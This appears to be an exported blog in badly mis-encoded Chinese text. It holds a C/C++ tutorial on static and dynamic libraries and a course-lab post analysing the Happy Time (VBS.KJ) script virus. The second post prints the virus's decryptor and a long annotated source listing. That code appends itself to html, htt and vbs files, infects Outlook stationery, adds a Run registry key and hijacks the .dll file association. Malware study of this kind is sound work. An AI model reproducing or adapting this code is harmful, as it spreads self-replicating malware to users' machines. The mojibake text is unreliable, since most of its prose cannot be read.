æ³¨ï¼šå¯¼å‡ºå‡½æ•°çš„å£°æ˜æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§å¦‚ä¸Šæ‰€ç¤ºï¼Œå¦ä¸€ç§é‡‡ç”¨æ¨¡å—å®šä¹‰(.def)æ–‡ä»¶å£°æ˜ï¼Œå…·ä½“ä¸Šç½‘æœ\ndllGen.cpp\n1 2 3 4 5 6 7 8 9  #include \"dllGen.h\"#include \u003ciostream\u003eusing namespace std; int test_add(int x, int y){ int sum; sum = x + y; return sum; }   ä½¿ç”¨ main.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #include \u003ciostream\u003eusing namespace std; #include \u003cwindows.h\u003e //å®šä¹‰ä¸€ä¸ªä¸myaddå‡½æ•°æ¥å—å‚æ•°ç±»å‹å’Œè¿”å› //å€¼å‡ç›¸åŒçš„å‡½æ•°æŒ‡é’ˆç±»å‹ typedef int(*lpAddFun)(int, int); int main(){ HINSTANCE hDll;//å¥æŸ„ \tlpAddFun addFun;//å‡½æ•°æŒ‡é’ˆ \thDll = LoadLibrary(\"dllGenTest.dll\");//åŠ¨æ€åŠ è½½DLLæ¨¡å—å¥æŸ„ \tif (hDll == NULL){ FreeLibrary(hDll); } //addFun = (lpAddFun)GetProcAddress(hDll, \"myadd\"); //é€šè¿‡å‡½æ•°åè·å–å‡½æ•°çš„åœ°å€ï¼Œæ²¡æœ‰è¿è¡Œ \taddFun = (lpAddFun)GetProcAddress(hDll, MAKEINTRESOURCE(1)); //é€šè¿‡å‡½æ•°çš„åºå·è·å–å‡½æ•°çš„åœ°å€ï¼Œwork \tif (addFun == NULL){ FreeLibrary(hDll); } int result; result = addFun(22,33); cout \u003c\u003c result \u003c\u003c endl; system(\"pause\"); FreeLibrary(hDll); return 0; }   Linux é™æ€åº“(.a) add.h\n1 2 3 4  #ifndef ADD_H #define ADD_H int add(int x,int y); #endif   add.c\n1 2 3 4 5 6  #include \u003cstdio.h\u003e#include \"add.h\"int add(int x, int y) { return (x + y); }   sub.h\n1 2 3 4  #ifndef _SUB_H_ #define _SUB_H_ int sub(int x, int y); #endif   sub.c\n1 2 3 4 5 6  #include \u003cstdio.h\u003e#include \"sub.h\"int sub(int x, int y) { return (x - y); }   main.c\n1 2 3 4 5 6 7 8 9 10 11 12  #include \u003cstdio.h\u003e#include \"sub.h\"#include \"add.h\" int main() { int a, b; a = add(1, 2); b = sub(10, 5); printf(\"a = % d, b = % d\\n\", a, b); return 0; }   ä¸ç®¡æ˜¯é™æ€å‡½æ•°åº“è¿˜æ˜¯åŠ¨æ€å‡½æ•°åº“ï¼Œéƒ½æ˜¯ç”±*.oç›®æ ‡æ–‡ä»¶ç”Ÿæˆã€‚\næ‰€ä»¥å…ˆå¤åˆ¶ä»£ç \n1 2  $ gcc -c add.c $ gcc -c sub.c   ç”Ÿæˆadd.oã€ sub.o\né™æ€å‡½æ•°åº“ç”±arå‘½ä»¤åˆ›å»º\n1  $ ar -crv libTest.a add.o sub.o    å‚æ•°ï¼š\n-c createçš„æ„æ€\n-r replaceçš„æ„æ€ï¼Œè¡¨ç¤ºå½“æ’å…¥çš„æ¨¡å—åå·²ç»åœ¨åº“ä¸­å­˜åœ¨ï¼Œåˆ™æ›¿æ¢åŒåçš„æ¨¡å—ã€‚å¦‚æœè‹¥å¹²æ¨¡å—ä¸­æœ‰ä¸€ä¸ªæ¨¡å—åœ¨åº“ä¸­ä¸å­˜åœ¨ï¼Œaræ˜¾ç¤ºä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œå¹¶ä¸æ›¿æ¢å…¶ä»–åŒåæ¨¡å—ã€‚é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œæ–°çš„æˆå‘˜å¢åŠ åœ¨åº“çš„ç»“å°¾å¤„ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–ä»»é€‰é¡¹æ¥æ”¹å˜å¢åŠ çš„ä½ç½®ã€‚\n åˆ°æ­¤é™æ€å‡½æ•°åº“åˆ›å»ºå®Œæ¯•ã€‚\nä½¿ç”¨æ–¹æ³• é€šè¿‡\n1  $ gcc -o main main.cpp -L. -lTest   ç¼–è¯‘main.cå°±ä¼šæŠŠé™æ€å‡½æ•°åº“æ•´åˆè¿›mainã€‚\n å‚æ•°ï¼š\n-L æŒ‡å®šé™æ€å‡½æ•°åº“çš„ä½ç½®ä¾›æŸ¥æ‰¾ï¼Œæ³¨æ„Låé¢è¿˜æœ‰'.'ï¼Œè¡¨ç¤ºé™æ€å‡½æ•°åº“åœ¨æœ¬ç›®å½•ä¸‹æŸ¥æ‰¾ã€‚\n-l åˆ™æŒ‡å®šäº†é™æ€å‡½æ•°åº“åï¼Œç”±äºé™æ€å‡½æ•°åº“çš„å‘½åæ–¹å¼æ˜¯lib*.aï¼Œ**å…¶ä¸­çš„libå’Œ.aå¿½ç•¥ã€‚**\n æ ¹æ®é™æ€å‡½æ•°åº“çš„ç‰¹æ€§ï¼Œæ­¤å¤„åˆ é™¤libaddsub.aåmainä¾ç„¶å¯ä»¥è¿è¡Œï¼Œå› ä¸ºé™æ€åº“çš„å†…å®¹å·²ç»æ•´åˆè¿›å»äº†ã€‚\nåŠ¨æ€åº“(.so) ç›´æ¥ç”¨ä¸Šé¢ä»£ç ç¼–è¯‘ï¼Œé€‰ç”¨gccé€‰é¡¹å³å¯\n1  $ gcc -shared -fpic -o libTest.so add.cpp sub.cpp    å‚æ•°\n-fpicï¼šäº§ç”Ÿä½ç½®æ— å…³ä»£ç \n-sharedï¼šç”Ÿæˆå…±äº«åº“\n 1  $ gcc -o out main.cpp -L. -lTest   æ­¤æ—¶è¿˜ä¸èƒ½ç«‹å³./outï¼Œå› ä¸ºåœ¨åŠ¨æ€å‡½æ•°åº“ä½¿ç”¨æ—¶ï¼Œä¼šæŸ¥æ‰¾/usr/lib /libç›®å½•ä¸‹çš„åŠ¨æ€å‡½æ•°åº“ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬ç”Ÿæˆçš„åº“ä¸åœ¨é‡Œè¾¹ã€‚\nè¿™ä¸ªæ—¶å€™æœ‰ä»¥ä¸‹å‡ ç§åŠæ³•å¯ä»¥è®©ä»–æˆåŠŸè¿è¡Œï¼š\n  æœ€ç›´æ¥æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠŠlibaddsub.soæ‹‰åˆ°/usr/lib æˆ–/libä¸­å»ã€‚\n  è¿˜æœ‰ä¸€ç§æ–¹æ³•,å‡è®¾libTest.soåœ¨/home/linux/Test\n  export LD_LIBRARY_PATH=/home/linux/Test:$LD_LIBRARY_PATH\n å¦å¤–è¿˜å¯ä»¥åœ¨/etc/ld.so.confæ–‡ä»¶é‡ŒåŠ å…¥æˆ‘ä»¬ç”Ÿæˆçš„åº“çš„ç›®å½•ï¼Œç„¶å/sbin/ldconfigã€‚   /etc/ld.so.confæ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢å­˜æ”¾çš„æ˜¯é“¾æ¥å™¨å’ŒåŠ è½½å™¨æœç´¢å…±äº«åº“æ—¶è¦æ£€æŸ¥çš„ç›®å½•ï¼Œé»˜è®¤æ˜¯ä»/usr/lib /libä¸­è¯»å–çš„ï¼Œæ‰€ä»¥æƒ³è¦é¡ºåˆ©è¿è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠæˆ‘ä»¬åº“çš„ç›®å½•åŠ å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­å¹¶æ‰§è¡Œ/sbin/ldconfigã€‚\n  g++(gcc)ç¼–è¯‘é€‰é¡¹\n  -c ï¼š ä»…ç¼–è¯‘æºä»£ç ä½†ä¸æ‰§è¡Œé“¾æ¥ï¼Œè¾“å‡ºç»“æœä¸ºå¯¹è±¡æ–‡ä»¶ï¼Œå³.o\n  -shared ï¼šæŒ‡å®šç”ŸæˆåŠ¨æ€é“¾æ¥åº“ã€‚\n  -static ï¼šæŒ‡å®šç”Ÿæˆé™æ€é“¾æ¥åº“ã€‚\n  -fPIC ï¼šè¡¨ç¤ºç¼–è¯‘ä¸ºä½ç½®ç‹¬ç«‹çš„ä»£ç ï¼Œç”¨äºç¼–è¯‘å…±äº«åº“ã€‚ç›®æ ‡æ–‡ä»¶éœ€è¦åˆ›å»ºæˆä½ç½®æ— å…³ç ï¼Œå¿µä¸Šå°±æ˜¯åœ¨å¯æ‰§è¡Œç¨‹åºè£…è½½å®ƒä»¬çš„æ—¶å€™ï¼Œå®ƒä»¬å¯ä»¥æ”¾åœ¨å¯æ‰§è¡Œç¨‹åºçš„å†…å­˜é‡Œçš„ä»»ä½•åœ°æ–¹ã€‚\n  -L. ï¼šè¡¨ç¤ºè¦è¿æ¥çš„åº“æ‰€åœ¨çš„ç›®å½•ã€‚\n  -lï¼šæŒ‡å®šé“¾æ¥æ—¶éœ€è¦çš„åŠ¨æ€åº“ã€‚ç¼–è¯‘å™¨æŸ¥æ‰¾åŠ¨æ€è¿æ¥åº“æ—¶æœ‰éšå«çš„å‘½åè§„åˆ™ï¼Œå³åœ¨ç»™å‡ºçš„åå­—å‰é¢åŠ ä¸Šlibï¼Œåé¢åŠ ä¸Š.a/.soæ¥ç¡®å®šåº“çš„åç§°ã€‚\n  -Wall ï¼šç”Ÿæˆæ‰€æœ‰è­¦å‘Šä¿¡æ¯ã€‚\n  -ggdb ï¼šæ­¤é€‰é¡¹å°†å°½å¯èƒ½çš„ç”Ÿæˆgdbçš„å¯ä»¥ä½¿ç”¨çš„è°ƒè¯•ä¿¡æ¯ã€‚\n  -g ï¼šç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™äº§ç”Ÿè°ƒè¯•ä¿¡æ¯ã€‚\n  -c ï¼šåªæ¿€æ´»é¢„å¤„ç†ã€ç¼–è¯‘å’Œæ±‡ç¼–,ä¹Ÿå°±æ˜¯æŠŠç¨‹åºåšæˆç›®æ ‡æ–‡ä»¶(.oæ–‡ä»¶)ã€‚\n  -Wl,options ï¼šæŠŠå‚æ•°(options)ä¼ é€’ç»™é“¾æ¥å™¨ldã€‚å¦‚æœoptionsä¸­é—´æœ‰é€—å·,å°±å°†optionsåˆ†æˆå¤šä¸ªé€‰é¡¹,ç„¶åä¼ é€’ç»™é“¾æ¥ç¨‹åºã€‚\n    lddå‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºä¾èµ–çš„å…±äº«åº“**   ","description":"","tags":["c++"],"title":"Link-Library-of-C++","uri":"/posts/link-library-of-c-/"},{"categories":["reverse"],"content":"0x00 åº æœ€è¿‘æ–°å‹å† çŠ¶ç—…æ¯’è‚†è™å…¨çƒï¼Œç„¶åæˆ‘å‘ç°æ—è€å¸ˆçš„è¯¾ç´§éšæ—¶äº‹ï¼Œä¸Šæ¬¡åˆšäº†è§£å®Œç†”æ–­ï¼Œè¿™æ¬¡ä¾¿æ¥äº†ç—…æ¯’\næ‰€è°“è®¡ç®—æœºç—…æ¯’ï¼Œæ— éä¹Ÿå°±æ˜¯ä¸€æ®µç¨‹åºï¼Œåªä¸è¿‡è¿™ä¸ªç¨‹åºæ˜¯ç”¨æ¥è¿›è¡Œä¼ æ’­æ„ŸæŸ“ç ´åè€Œå·²ï¼Œå€Ÿç”¨wikiä¸­çš„å®šä¹‰ï¼Œç”µè„‘ç—…æ¯’å…·æœ‰çš„ä¸è‰¯ç‰¹å¾æœ‰ä¼ æ’­æ€§ã€éšè”½æ€§ã€æ„ŸæŸ“æ€§ã€æ½œä¼æ€§ã€å¯æ¿€å‘æ€§ã€è¡¨ç°æ€§æˆ–ç ´åæ€§ï¼Œé€šå¸¸è¡¨ç°ä¸¤ç§ä»¥ä¸Šæ‰€è¿°çš„ç‰¹å¾å°±å¯ä»¥è®¤å®šè¯¥ç¨‹åºæ˜¯ç—…æ¯’ã€‚\nè®¡ç®—æœºç—…æ¯’çš„ç”Ÿå‘½å‘¨æœŸä¸ºå¼€å‘æœŸâ†’ä¼ æŸ“æœŸâ†’æ½œä¼æœŸâ†’å‘ä½œæœŸâ†’å‘ç°æœŸâ†’æ¶ˆåŒ–æœŸâ†’æ¶ˆäº¡æœŸ\n èµ„æ–™ï¼š\nè®¡ç®—æœºç—…æ¯’-wiki\n About ç—…æ¯’çš„æ¥æº\næµ…è°ˆäºŒè¿›åˆ¶æ¼æ´ç ”ç©¶ä¸ç—…æ¯’ç ”ç©¶\n  è®¡ç®—æœºç—…æ¯’çš„åˆ†ç±»  æœ¨é©¬ç—…æ¯’ï¼šæ¯”å¦‚rootkitï¼Œç‰¹æ´›ä¼Šæœ¨é©¬ äºŒè¿›åˆ¶ç—…æ¯’ï¼ˆå³wikiä¸­çš„æœ‰å®³è½¯ä»¶ï¼‰ï¼šæ¯”å¦‚è •è™«ç—…æ¯’ï¼Œå†²å‡»æ³¢ç—…æ¯’ï¼Œéœ‡è¡æ³¢ç—…æ¯’ è„šæœ¬ç—…æ¯’ï¼šæ¯”å¦‚å®ç—…æ¯’  ç—…æ¯’åˆ†æ ç„¶ååº”å®éªŒè¦æ±‚æˆ‘ä»¬æ¥åšäº›ç—…æ¯’åˆ†æ\nè„šæœ¬ç—…æ¯’ æ‰€è°“è„šæœ¬ç—…æ¯’ï¼Œå°±æ˜¯ç”¨è„šæœ¬è¯­è¨€è®¾è®¡çš„è®¡ç®—æœºç—…æ¯’ï¼Œæµè¡Œçš„è„šæœ¬è¯­è¨€æ¯”å¦‚javascriptä»¥åŠvbscript\nvbs  vbsåŸºæœ¬è¯­æ³•\nvbScript_function\n msgbox \"strings\"ï¼šå¼¹å‡ºå¯¹è¯æ¡†\nåœ¨IE11ä¹‹åï¼Œä¸æ”¯æŒhtmå†…åµŒvbscript\nhappytimeç—…æ¯’  Github-amg1127 / virus_VBS-Haptime\næµ…ææ¬¢ä¹æ—¶å…‰ï¼ˆHAPPY TIMEï¼‰ç—…æ¯’\n ä¹‹å‰æ˜¯æŠŠç—…æ¯’å†…åµŒè¿›å…¥htmlä¸­ï¼Œå½“åŠ è½½htmlæ—¶æ‰§è¡Œäº†vbscriptè„šæœ¬ï¼Œç±»ä¼¼äºç°åœ¨htmlè‡ªåŠ¨æ‰§è¡Œjavascriptè„šæœ¬\nå¤§æ¦‚ç—…æ¯’æ–‡ä»¶é•¿ä¸‹é¢è¿™ä¸ªæ ·ï¼Œç”±äºå¯†æ–‡è¿‡é•¿å°±ä¸ç²˜è´´äº†ï¼Œç„¶åé€šè¿‡executeæ‰§è¡Œè§£å¯†å‡½æ•°\nåŠ å¯†çš„ç®—æ³•æ˜¯å…ˆç”Ÿæˆå››ä¸ªç®—å­ï¼Œæ¯ä¸ªå­—ç¬¦å‡å»å¯¹åº”çš„ç®—å­ï¼Œè§£å¯†æ—¶å†æŒ‰é¡ºåºåŠ å›æ¥\n1 2 3 4 5 6 7 8 9  script language=vbscript\u003e document.write \"\u003cdiv style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'\u003e\u003c\"\u0026\"APPLET NAME=KJ\"\u0026\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\u0026\"activeX.Active\"\u0026\"XComponent\u003e\u003c/APPLET\u003e\u003c/div\u003e\" \u003c/script\u003e \u003cscript language=vbscript\u003e ExeString = \"Encrypto Strings\" Execute(\"Dim KeyArr(3),ThisText\"\u0026vbCrLf\u0026\"KeyArr(0) = 1\"\u0026vbCrLf\u0026\"KeyArr(1) = 3\"\u0026vbCrLf\u0026\"KeyArr(2) = 4\"\u0026vbCrLf\u0026\"KeyArr(3) = 8\"\u0026vbCrLf\u0026\"For i=1 To Len(ExeString)\"\u0026vbCrLf\u0026\"TempNum = Asc(Mid(ExeString,i,1))\"\u0026vbCrLf\u0026\"If TempNum = 18 Then\"\u0026vbCrLf\u0026\"TempNum = 34\"\u0026vbCrLf\u0026\"End If\"\u0026vbCrLf\u0026\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\u0026vbCrLf\u0026\"If TempChar = Chr(28) Then\"\u0026vbCrLf\u0026\"TempChar = vbCr\"\u0026vbCrLf\u0026\"ElseIf TempChar = Chr(29) Then\"\u0026vbCrLf\u0026\"TempChar = vbLf\"\u0026vbCrLf\u0026\"End If\"\u0026vbCrLf\u0026\"ThisText = ThisText \u0026 TempChar\"\u0026vbCrLf\u0026\"Next\") 'Execute(ThisText) msgbox(ThisText) \u003c/script\u003e   å¦‚ä¸‹å›¾ï¼Œæ’å…¥msgboxå¯ä»¥æŸ¥çœ‹ä»£ç \nå‘ç°è€å¸ˆç»™çš„æºç å’Œç½‘ä¸Šçš„ç•¥æœ‰ä¸åŒ\nä»¥ä¸‹æ˜¯æ¥è‡ªDanceFireå¯¹ç—…æ¯’æºç çš„åˆ†æ\n vbså¸¸è¯†ï¼š\n Sub func()ï¼šæ˜¯å¯¹æ— è¿”å›å€¼å‡½æ•°çš„å£°æ˜ function func()ï¼šæ˜¯å¯¹æœ‰è¿”å›å€¼å‡½æ•°çš„å£°æ˜ 'ï¼šä»¥'æ‰“å¤´æ˜¯åœ¨vbsçš„å•è¡Œæ³¨é‡Šè¯­å¥ Exitï¼šåæ¥forã€doã€functionã€Subï¼šæŒ‡å¾ªç¯æˆ–å‡½æ•°çš„é€€å‡ºï¼Œç›¸å½“äºæˆ‘ä»¬Cä¸­çš„å¾ªç¯çš„breakå’Œå‡½æ•°çš„return On Error Resume Next ï¼šæ˜¯vbsçš„é”™è¯¯å¤„ç†è¯­å¥ï¼Œå¯¹é”™è¯¯è¿›è¡Œæé†’ï¼Œç„¶åç»§ç»­è¿è¡Œç¨‹åº Set objectvar = {objectexpression | New classname | Nothing}ï¼šSetè¯­å¥å°±æ˜¯vbsä¸­ç»™å˜é‡èµ‹å€¼çš„è¯­å¥ [Call] name [argumentlist]ï¼š Callè¯­å¥ï¼Œæ­£å¦‚æ±‡ç¼–ä¸­çš„callï¼Œç”¨äºå‡½æ•°çš„è°ƒç”¨ï¼Œargumentlistä¸ºä¼ å…¥å‡½æ•°çš„å‚æ•°   #é¿å…æ‰§è¡Œä¹‹ ' ccor ccor@263.net ' å‘è¡¨äº 2002-12-1 8:55:25 ' VBS.KJ[æ–°æ¬¢ä¹æ—¶å…‰ç—…æ¯’]æºä»£ç åˆ†æ ' Virus: VBS.KJ ' Analyze by DanceFire ( DanceFire@263.net ) ' 2002/7/10 ' Dim InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk Sub KJ_start() ' åˆå§‹åŒ–å˜é‡ KJSetDim() ' åˆå§‹åŒ–ç¯å¢ƒ KJCreateMilieu() ' æ„ŸæŸ“æœ¬åœ°æˆ–è€…å…±äº«ä¸Šä¸htmlæ‰€åœ¨ç›®å½• KJLikeIt() ' é€šè¿‡vbsæ„ŸæŸ“Outlooké‚®ä»¶æ¨¡æ¿ KJCreateMail() ' è¿›è¡Œç—…æ¯’ä¼ æ’­ KJPropagate() End Sub ' å‡½æ•°ï¼šKJAppendTo(FilePath,TypeStr) ' åŠŸèƒ½ï¼šå‘æŒ‡å®šç±»å‹çš„æŒ‡å®šæ–‡ä»¶è¿½åŠ ç—…æ¯’ ' å‚æ•°ï¼š ' FilePath æŒ‡å®šæ–‡ä»¶è·¯å¾„ ' TypeStr æŒ‡å®šç±»å‹ Function KJAppendTo(FilePath,TypeStr) On Error Resume Next ' ä»¥åªè¯»æ–¹å¼æ‰“å¼€æŒ‡å®šæ–‡ä»¶ Set ReadTemp = FSO.OpenTextFile(FilePath,1) ' å°†æ–‡ä»¶å†…å®¹è¯»å…¥åˆ°TmpStrå˜é‡ä¸­ TmpStr = ReadTemp.ReadAll ' åˆ¤æ–­æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨\"KJ_start()\"å­—ç¬¦ä¸²ï¼Œè‹¥å­˜åœ¨è¯´æ˜å·²ç»æ„ŸæŸ“ï¼Œé€€å‡ºå‡½æ•°ï¼› ' è‹¥æ–‡ä»¶é•¿åº¦å°äº1ï¼Œä¹Ÿé€€å‡ºå‡½æ•°ã€‚ If Instr(TmpStr,\"KJ_start()\") \u003c\u003e 0 Or Len(TmpStr) \u003c 1 Then ReadTemp.Close Exit Function End If ' å¦‚æœä¼ è¿‡æ¥çš„ç±»å‹æ˜¯\"htt\" ' åœ¨æ–‡ä»¶å¤´åŠ ä¸Šè°ƒç”¨é¡µé¢çš„æ—¶å€™åŠ è½½KJ_start()å‡½æ•°; ' åœ¨æ–‡ä»¶å°¾è¿½åŠ htmlç‰ˆæœ¬çš„åŠ å¯†ç—…æ¯’ä½“ã€‚ ' å¦‚æœæ˜¯\"html\" ' åœ¨æ–‡ä»¶å°¾è¿½åŠ è°ƒç”¨é¡µé¢çš„æ—¶å€™åŠ è½½KJ_start()å‡½æ•°å’Œhtmlç‰ˆæœ¬çš„ç—…æ¯’ä½“; ' å¦‚æœæ˜¯\"vbs\" ' åœ¨æ–‡ä»¶å°¾è¿½åŠ vbsç‰ˆæœ¬çš„ç—…æ¯’ä½“ If TypeStr = \"htt\" Then ReadTemp.Close Set FileTemp = FSO.OpenTextFile(FilePath,2) FileTemp.Write \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 TmpStr \u0026 vbCrLf \u0026 HtmlText FileTemp.Close Set FAttrib = FSO.GetFile(FilePath) FAttrib.attributes = 34 Else ReadTemp.Close Set FileTemp = FSO.OpenTextFile(FilePath,8) If TypeStr = \"html\" Then FileTemp.Write vbCrLf \u0026 \"\u003c\" \u0026 \"HTML\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 HtmlText ElseIf TypeStr = \"vbs\" Then FileTemp.Write vbCrLf \u0026 VbsText End If FileTemp.Close End If End Function ' å‡½æ•°ï¼šKJChangeSub(CurrentString,LastIndexChar) ' åŠŸèƒ½ï¼šæ”¹å˜å­ç›®å½•ä»¥åŠç›˜ç¬¦ ' å‚æ•°ï¼š ' CurrentString å½“å‰ç›®å½• ' LastIndexChar ä¸Šä¸€çº§ç›®å½•åœ¨å½“å‰è·¯å¾„ä¸­çš„ä½ç½® Function KJChangeSub(CurrentString,LastIndexChar) ' åˆ¤æ–­æ˜¯å¦æ˜¯æ ¹ç›®å½• If LastIndexChar = 0 Then ' å¦‚æœæ˜¯æ ¹ç›®å½• ' å¦‚æœæ˜¯C:\\ï¼Œè¿”å›FinalyDiskç›˜ï¼Œå¹¶å°†SubEç½®ä¸º0ï¼Œ ' å¦‚æœä¸æ˜¯C:\\ï¼Œè¿”å›å°†å½“å‰ç›˜ç¬¦é€’å‡1ï¼Œå¹¶å°†SubEç½®ä¸º0 If Left(LCase(CurrentString),1) =\u003c LCase(\"c\") Then KJChangeSub = FinalyDisk \u0026 \":\\\" SubE = 0 Else KJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) \u0026 \":\\\" SubE = 0 End If Else ' å¦‚æœä¸æ˜¯æ ¹ç›®å½•ï¼Œåˆ™è¿”å›ä¸Šä¸€çº§ç›®å½•åç§° KJChangeSub = Mid(CurrentString,1,LastIndexChar) End If End Function ' å‡½æ•°ï¼šKJCreateMail() ' åŠŸèƒ½ï¼šæ„ŸæŸ“é‚®ä»¶éƒ¨åˆ† Function KJCreateMail() On Error Resume Next ' å¦‚æœå½“å‰æ‰§è¡Œæ–‡ä»¶æ˜¯\"html\"çš„ï¼Œå°±é€€å‡ºå‡½æ•° If InWhere = \"html\" Then Exit Function End If ' å–ç³»ç»Ÿç›˜çš„ç©ºç™½é¡µçš„è·¯å¾„ ShareFile = Left(WinPath,3) \u0026 \"Program Files\\Common Files\\Microsoft Shared\\Stationery\\blank.htm\" ' å¦‚æœå­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå°±å‘å…¶è¿½åŠ htmlçš„ç—…æ¯’ä½“ ' å¦åˆ™ç”Ÿæˆå«æœ‰ç—…æ¯’ä½“çš„è¿™ä¸ªæ–‡ä»¶ If (FSO.FileExists(ShareFile)) Then Call KJAppendTo(ShareFile,\"html\") Else Set FileTemp = FSO.OpenTextFile(ShareFile,2,true) FileTemp.Write \"\u003c\" \u0026 \"HTML\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 HtmlText FileTemp.Close End If ' å–å¾—å½“å‰ç”¨æˆ·çš„IDå’ŒOutLookçš„ç‰ˆæœ¬ DefaultId = WsShell.RegRead(\"HKEY_CURRENT_USER\\Identities\\Default User ID\") OutLookVersion = WsShell.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\MediaVer\") ' æ¿€æ´»ä¿¡çº¸åŠŸèƒ½ï¼Œå¹¶æ„ŸæŸ“æ‰€æœ‰ä¿¡çº¸ WsShell.RegWrite \"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Compose Use Stationery\",1,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Stationery Name\",ShareFile) Call KJMailReg(\"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Wide Stationery Name\",ShareFile) WsShell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\Mail\\EditorPreference\",131072,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\",\"blank\") Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\",\"blank\") WsShell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Options\\Mail\\EditorPreference\",131072,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Common\\MailSettings\\NewStationery\",\"blank\") KJummageFolder(Left(WinPath,3) \u0026 \"Program Files\\Common Files\\Microsoft Shared\\Stationery\") End Function ' å‡½æ•°:KJCreateMilieu() ' åŠŸèƒ½ï¼šåˆ›å»ºç³»ç»Ÿç¯å¢ƒ Function KJCreateMilieu() On Error Resume Next TempPath = \"\" ' åˆ¤æ–­æ“ä½œç³»ç»Ÿæ˜¯NT/2000è¿˜æ˜¯9X If Not(FSO.FileExists(WinPath \u0026 \"WScript.exe\")) Then TempPath = \"system32\\\" End If ' ä¸ºäº†æ–‡ä»¶åèµ·åˆ°è¿·æƒ‘æ€§ï¼Œå¹¶ä¸”ä¸ä¼šä¸ç³»ç»Ÿæ–‡ä»¶å†²çªã€‚ ' å¦‚æœæ˜¯NT/2000åˆ™å¯åŠ¨æ–‡ä»¶ä¸ºsystem\\Kernel32.dll ' å¦‚æœæ˜¯9xå¯åŠ¨æ–‡ä»¶åˆ™ä¸ºsystem\\Kernel.dll If TempPath = \"system32\\\" Then StartUpFile = WinPath \u0026 \"SYSTEM\\Kernel32.dll\" Else StartUpFile = WinPath \u0026 \"SYSTEM\\Kernel.dll\" End If ' æ·»åŠ Runå€¼ï¼Œæ·»åŠ åˆšæ‰ç”Ÿæˆçš„å¯åŠ¨æ–‡ä»¶è·¯å¾„ WsShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Kernel32\",StartUpFile ' æ‹·è´å‰æœŸå¤‡ä»½çš„æ–‡ä»¶åˆ°åŸæ¥çš„ç›®å½• FSO.CopyFile WinPath \u0026 \"web\\kjwall.gif\",WinPath \u0026 \"web\\Folder.htt\" FSO.CopyFile WinPath \u0026 \"system32\\kjwall.gif\",WinPath \u0026 \"system32\\desktop.ini\" ' å‘%windir%\\web\\Folder.httè¿½åŠ ç—…æ¯’ä½“ Call KJAppendTo(WinPath \u0026 \"web\\Folder.htt\",\"htt\") ' æ”¹å˜dllçš„MIMEå¤´ ' æ”¹å˜dllçš„é»˜è®¤å›¾æ ‡ ' æ”¹å˜dllçš„æ‰“å¼€æ–¹å¼ WsShell.RegWrite \"HKEY_CLASSES_ROOT\\.dll\\\",\"dllfile\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\.dll\\Content Type\",\"application/x-msdownload\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllfile\\DefaultIcon\\\",WsShell.RegRead(\"HKEY_CLASSES_ROOT\\vxdfile\\DefaultIcon\\\") WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllfile\\ScriptEngine\\\",\"VBScript\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllFile\\Shell\\Open\\Command\\\",WinPath \u0026 TempPath \u0026 \"WScript.exe \"\"%1\"\" %*\" WsShell.RegWrite 